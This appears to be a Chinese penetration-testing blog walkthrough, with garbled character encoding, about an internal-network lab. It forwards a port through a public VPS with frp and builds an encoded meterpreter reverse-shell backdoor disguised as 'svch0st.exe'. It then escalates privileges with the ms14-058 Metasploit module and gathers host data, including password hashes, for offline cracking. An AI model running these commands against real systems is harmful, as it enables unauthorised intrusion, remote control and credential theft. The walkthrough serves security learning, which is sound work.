<!DOCTYPE html><html lang="zh-cn"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="format-detection" content="email=no"><meta name="description"><meta name="keywords" content="Hexo, Gruntjs, Nodejs, Reactjs, Vuejs"><title>PenTest Vol.7 - å†…ç½‘ | å†…ç½‘æ¸—é€éƒ¨åˆ† - Naykcin's Page</title><link rel="stylesheet" href="/css/main_style.min.css"><link rel="icon" href="/logo.png"></head><body><input id="navi" type="checkbox"><ul class="main-navication"><li><a href="/"><span>Home</span></a></li><li><a href="https://github.com"><span>Github</span></a></li><li><a href="https://www.v2ex.com/"><span>V2EX</span></a></li></ul><div class="wrapper" id="wrap"><div class="post-header"><label class="navi-button light" for="navi">MENU</label><img class="background" src="http://47.95.140.43/typora_pic/background.JPG"><div class="post-title"><h1 class="title">PenTest Vol.7 - å†…ç½‘ | å†…ç½‘æ¸—é€éƒ¨åˆ†</h1><ul class="meta"><li><i class="icon icon-author"></i>Naykcin</li><li><i class="icon icon-clock"></i>12 Minutes</li><li><i class="icon icon-calendar"></i>November 22, 2019</li></ul></div></div><div class="article-content" style="max-width:800px"><h2 id="PenTest-Vol-7-å†…ç½‘-å†…ç½‘æ¸—é€éƒ¨åˆ†-æŒç»­æ›´æ–°"><a href="#PenTest-Vol-7-å†…ç½‘-å†…ç½‘æ¸—é€éƒ¨åˆ†-æŒç»­æ›´æ–°" class="headerlink" title="PenTest Vol.7 - å†…ç½‘ | å†…ç½‘æ¸—é€éƒ¨åˆ† [æŒç»­æ›´æ–°]"></a><center>PenTest Vol.7 - å†…ç½‘ | å†…ç½‘æ¸—é€éƒ¨åˆ† [æŒç»­æ›´æ–°]</center></h2><p>ğŸ’¡ é€šå¸¸éƒ½æ˜¯åœ¨å†…ç½‘ç¯å¢ƒä¸­åˆ©ç”¨ msfvenom åˆ¶ä½œåé—¨å¹¶æµ‹è¯•ï¼Œä½†æ˜¯çœŸå®ç¯å¢ƒä¸­ä¸èƒ½è®¾ç½® Kali å†…ç½‘ IP æ¥ä½¿ç›®æ ‡ç³»ç»Ÿ reverse è¿æ¥ï¼Œè¿™æ—¶å°±éœ€è¦åˆ©ç”¨ vps åšä¸€ä¸ªç«¯å£è½¬å‘ï¼Œåœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹å§¿åŠ¿ã€‚</p>
<h4 id="ğŸ“-é¦–å…ˆè¯´æ€è·¯ï¼š"><a href="#ğŸ“-é¦–å…ˆè¯´æ€è·¯ï¼š" class="headerlink" title="ğŸ“ é¦–å…ˆè¯´æ€è·¯ï¼š"></a>ğŸ“ é¦–å…ˆè¯´æ€è·¯ï¼š</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// Target å†…ç½‘</span><br><span class="line">Windows XP				192.168.0.205</span><br><span class="line"></span><br><span class="line">// å…¬ç½‘ vps</span><br><span class="line">ubuntu						1.1.1.1</span><br><span class="line"></span><br><span class="line">// Hacker</span><br><span class="line">Kali							192.168.0.105</span><br></pre></td></tr></table></figure>

<p>å…¬ç½‘ vps è¿è¡Œ frp serverï¼ŒKali è¿è¡Œ frp clientï¼Œå°† Kali æœ¬åœ°çš„ç«¯å£æ˜ å°„è‡³ vpsã€‚</p>
<ol>
<li><p>ä¸‹è½½ frp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/fatedier/frp/releases</span><br></pre></td></tr></table></figure>
</li>
<li><p>é¦–å…ˆé…ç½®å…¬ç½‘ vps frp æœåŠ¡ç«¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// ./frps.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">bind_port = 6767		// ä¸ Kali è½¬å‘çš„ç«¯å£</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¯åŠ¨æœåŠ¡ç«¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure>
</li>
<li><p>æ¥ç€é…ç½®å®¢æˆ·ç«¯ï¼ˆKaliï¼‰ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// ./frpc.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr = vps åœ°å€</span><br><span class="line">server_port = 6767 		// ä¸ Kali è½¬å‘çš„ç«¯å£</span><br><span class="line"></span><br><span class="line">[msf]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 1234				// å¼¹å› Kali æœ¬åœ°çš„ç«¯å£</span><br><span class="line">remote_port = 16200			// taget reverse è¿æ¥ vps çš„ç«¯å£ï¼Œå’Œç”Ÿæˆåé—¨çš„ç«¯å£ä¸€è‡´</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¯åŠ¨å®¢æˆ·ç«¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure>
</li>
<li><p>ç”Ÿæˆåé—¨</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=vpsIP LPORT=16200 -b&quot;\x00&quot; -e x86/shikata_ga_nai -f exe &gt; /root/svch0st.exe</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¼€å¯ msfconsole ç›‘å¬æœ¬åœ°ç«¯å£ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5&gt; use exploit/multi/handler</span><br><span class="line">msf5&gt; set lhost 127.0.0.1</span><br><span class="line">msf5&gt; set lport 1234</span><br><span class="line">msf5&gt; exploit</span><br></pre></td></tr></table></figure>
</li>
<li><p>ç„¶åå³å¯å¼¹å› shellã€‚</p>
<p><img src="http://47.95.140.43/tu/pentest7/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-31%20%e4%b8%8a%e5%8d%8812.54.27.png" alt="å±å¹•å¿«ç…§ 2019-12-31 ä¸Šåˆ12.54.27"></p>
<p>æ¥ç€æŸ¥çœ‹ç”¨æˆ·æƒé™ï¼Œå°è¯•ææƒå¤±è´¥ï¼Œè·å–ç³»ç»Ÿä¿¡æ¯çœ‹æ˜¯å¦æœ‰å¯ä»¥åˆ©ç”¨çš„å†…æ ¸æ¼æ´æ¥ææƒï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; getuid</span><br><span class="line">meterpreter&gt; getsystem</span><br></pre></td></tr></table></figure>

<p>æœç´¢åå‘ç°ç›®æ ‡ä¸»æœºå¯èƒ½å­˜åœ¨ ms14-058 ææƒæ¼æ´ï¼Œè¿™é‡Œè¦æ³¨æ„åˆ©ç”¨ frp å†æ˜ å°„ä¸€ä¸ªç«¯å£ï¼Œå»ºç«‹æ–°çš„æ–‡ä»¶å¤¹ï¼Œç”Ÿæˆæ–°çš„æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯é…ç½®æ–‡ä»¶ï¼Œå†æ¬¡ç›‘å¬ã€æ˜ å°„ç«¯å£ï¼Œç„¶åå»ºç«‹ä¸€ä¸ªæ–°çš„ msfconsoleï¼Œç›‘å¬æœ¬åœ°å¦å¤–ä¸€ä¸ªç«¯å£ï¼Œå¼¹å›ä¸€ä¸ªé«˜æƒé™çš„ shellï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// msfconsole 1 æ‰§è¡Œ</span><br><span class="line">msf5&gt; use exploit/windows/local/ms14_058_track_popup_menu</span><br><span class="line">msf5&gt; set lhost vpsIP</span><br><span class="line">msf5&gt; set lport 12345</span><br><span class="line">msf5&gt; exploit</span><br><span class="line"></span><br><span class="line">// msfconsole 2 æ‰§è¡Œ</span><br><span class="line">msf5&gt; use exploit/multi/handler</span><br><span class="line">msf5&gt; set lhost 127.0.0.1</span><br><span class="line">msf5&gt; set lport 1235</span><br><span class="line">msf5&gt; exploit</span><br></pre></td></tr></table></figure>

<p><img src="http://47.95.140.43/tu/pentest7/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-31%20%e4%b8%8a%e5%8d%882.05.05.png" alt="å±å¹•å¿«ç…§ 2019-12-31 ä¸Šåˆ2.05.05"></p>
</li>
</ol>
<p>è‡³æ­¤å·²ç»è·å–äº†å†…ç½‘çš„ system æƒé™ï¼Œæ¥ä¸‹æ¥çš„æ€è·¯æ˜¯è¿›è¡Œæœ¬åœ°ä¿¡æ¯æ”¶é›†ï¼Œè¿›è¡Œå†…ç½‘æ¨ªå‘ç§»åŠ¨ã€‚</p>
<h4 id="ğŸ“-æ¨ªå‘ç§»åŠ¨éƒ¨åˆ†"><a href="#ğŸ“-æ¨ªå‘ç§»åŠ¨éƒ¨åˆ†" class="headerlink" title="ğŸ“ æ¨ªå‘ç§»åŠ¨éƒ¨åˆ†"></a>ğŸ“ æ¨ªå‘ç§»åŠ¨éƒ¨åˆ†</h4><p>âš™ï¸ <strong>æœ¬åœ°ä¿¡æ¯æ”¶é›†</strong></p>
<ul>
<li><p>è·å–ç›®æ ‡ä¸»æœºçš„åˆ†åŒºæƒ…å†µ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run post/windows/gather/forensics/enum_drives</span><br></pre></td></tr></table></figure>

<p><img src="http://47.95.140.43/tu/pentest7/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-31%20%e4%b8%8a%e5%8d%882.11.18.png" alt="å±å¹•å¿«ç…§ 2019-12-31 ä¸Šåˆ2.11.18"></p>
</li>
<li><p>åˆ¤æ–­æ˜¯å¦æ˜¯è™šæ‹Ÿæœº</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run post/windows/gather/checkvm</span><br></pre></td></tr></table></figure>

<p><img src="http://47.95.140.43/tu/pentest7/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-31%20%e4%b8%8a%e5%8d%882.13.18.png" alt="å±å¹•å¿«ç…§ 2019-12-31 ä¸Šåˆ2.13.18"></p>
</li>
<li><p>è·å–è¿è¡Œçš„æœåŠ¡ï¼ˆåŒ…æ‹¬æƒé™ã€è·¯å¾„ç­‰è¯¦ç»†ä¿¡æ¯ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run post/windows/gather/enum_services</span><br></pre></td></tr></table></figure>

<p><img src="http://47.95.140.43/tu/pentest7/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-31%20%e4%b8%8a%e5%8d%882.16.02.png" alt="å±å¹•å¿«ç…§ 2019-12-31 ä¸Šåˆ2.16.02"></p>
<p><img src="http://47.95.140.43/tu/pentest7/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-31%20%e4%b8%8a%e5%8d%882.16.17.png" alt="å±å¹•å¿«ç…§ 2019-12-31 ä¸Šåˆ2.16.17"></p>
<p>è¾“å‡ºçš„æ–‡ä»¶ä¸­è®°å½•äº†è¯¦ç»†ä¿¡æ¯ã€‚</p>
</li>
<li><p>è·å–å®‰è£…çš„åº”ç”¨</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterptreter&gt; run post/windows/gather/enum_applications</span><br></pre></td></tr></table></figure>

<p><img src="http://47.95.140.43/tu/pentest7/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-31%20%e4%b8%8a%e5%8d%882.18.53.png" alt="å±å¹•å¿«ç…§ 2019-12-31 ä¸Šåˆ2.18.53"></p>
</li>
<li><p>è·å–ç›®æ ‡ä¸»æœºçš„å…±äº«æ–‡ä»¶å¤¹ç­‰</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run post/windows/gather/enum_shares</span><br></pre></td></tr></table></figure>

<p><img src="http://47.95.140.43/tu/pentest7/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-31%20%e4%b8%8a%e5%8d%882.20.20.png" alt="å±å¹•å¿«ç…§ 2019-12-31 ä¸Šåˆ2.20.20"></p>
</li>
<li><p>åˆ—å‡ºç›®æ ‡ä¸»æœºæœ€è¿‘çš„æ“ä½œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run post/windows/gather/dumplinks</span><br></pre></td></tr></table></figure>

<p><img src="http://47.95.140.43/tu/pentest7/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-31%20%e4%b8%8a%e5%8d%882.22.46.png" alt="å±å¹•å¿«ç…§ 2019-12-31 ä¸Šåˆ2.22.46"></p>
</li>
<li><p>æŸ¥çœ‹ç›®æ ‡ä¸»æœºè¡¥ä¸ä¿¡æ¯ï¼Œåˆ—å‡ºå¯èƒ½å­˜åœ¨çš„æ¼æ´</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_patches</span><br></pre></td></tr></table></figure>

<p><img src="http://47.95.140.43/tu/pentest7/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-31%20%e4%b8%8a%e5%8d%882.24.15.png" alt="å±å¹•å¿«ç…§ 2019-12-31 ä¸Šåˆ2.24.15"></p>
</li>
<li><p>åˆ©ç”¨è„šæœ¬è¿›è¡Œè¯¦ç»†çš„ä¿¡æ¯æ”¶é›†</p>
<ul>
<li><p>run scraper</p>
<p><img src="http://47.95.140.43/tu/pentest7/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-31%20%e4%b8%8a%e5%8d%882.30.24.png" alt="å±å¹•å¿«ç…§ 2019-12-31 ä¸Šåˆ2.30.24"></p>
<p><img src="http://47.95.140.43/tu/pentest7/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-31%20%e4%b8%8a%e5%8d%882.31.37.png" alt="å±å¹•å¿«ç…§ 2019-12-31 ä¸Šåˆ2.31.37"></p>
</li>
<li><p>run winenum</p>
<p><img src="http://47.95.140.43/tu/pentest7/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-31%20%e4%b8%8a%e5%8d%882.33.28.png" alt="å±å¹•å¿«ç…§ 2019-12-31 ä¸Šåˆ2.33.28"></p>
<p><img src="http://47.95.140.43/tu/pentest7/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-31%20%e4%b8%8a%e5%8d%882.34.46.png" alt="å±å¹•å¿«ç…§ 2019-12-31 ä¸Šåˆ2.34.46"></p>
<p>ä¾‹å¦‚ç³»ç»Ÿä¿¡æ¯ã€ç½‘ç»œé…ç½®ã€å¯†ç  hash å€¼ã€æ³¨å†Œè¡¨ã€ç¯å¢ƒå˜é‡ç­‰éƒ½å¯ä»¥è·å–åˆ°ã€‚</p>
<p>hash å€¼å¯ä»¥åˆ©ç”¨ john ç›´æ¥è¿›è¡Œç¦»çº¿çˆ†ç ´ã€‚</p>
<p>å¦‚æœç¼–ç æœ‰é—®é¢˜å¯ä»¥å°è¯•æ›´æ”¹ç¼–ç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Preferences -&gt; Encodings -&gt; å‹¾é€‰ä¸­æ–‡ç®€ä½“çš„GBK</span><br><span class="line">Terminal -&gt; Set Character Encoding -&gt; é€‰æ‹©GB2312</span><br></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
</div><div class="article-meta" style="max-width:800px"></div><div class="article-comment" style="max-width:800px"><div class="ds-thread" id="ds-thread" data-thread-key="ck67g9f73000d3lozh6ex4jic" data-title="PenTest Vol.7 - å†…ç½‘ | å†…ç½‘æ¸—é€éƒ¨åˆ†" data-url="http://yoursite.com/2019/11/22/å†…ç½‘æ¸—é€/" site-name="ueibo"></div><script>var siteName = document.getElementById('ds-thread').getAttribute('site-name');
var duoshuoQuery = {short_name: siteName};
(function() {
  var ds = document.createElement('script');
  ds.type = 'text/javascript';ds.async = true;
  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
  ds.charset = 'UTF-8';
  (document.getElementsByTagName('head')[0] 
  || document.getElementsByTagName('body')[0]).appendChild(ds);
})();</script></div><ul class="navication"><li class="home"><a href="/"><i class="icon icon-home"></i></a></li><li><a href="/2019/11/24/burpæ’ä»¶jsEncrypterç”¨æ³•/"><i class="icon icon-arror-left"></i></a></li><li><a href="/2019/11/20/æœªæˆæƒè®¿é—®æ¼æ´/"><i class="icon icon-arror-right"></i></a></li></ul><div class="page-footer"><div class="top"><ul class="social"><li><a href="https://github.com/NickYan7" title="Github" target="_blank"><i class="icon icon-github"></i></a></li><li><a href="http://47.95.140.43/tu/721580653348_.pic.jpg" title="wechat" target="_blank"><i class="icon icon-wechat"></i></a></li></ul></div><div class="bottom"><p class="copyright">Â© 2020 Naykcin's Page</p></div></div></div><script>var wrap = document.getElementById('wrap');
window.onload = function () {
  wrap.className += ' done';
}</script></body></html>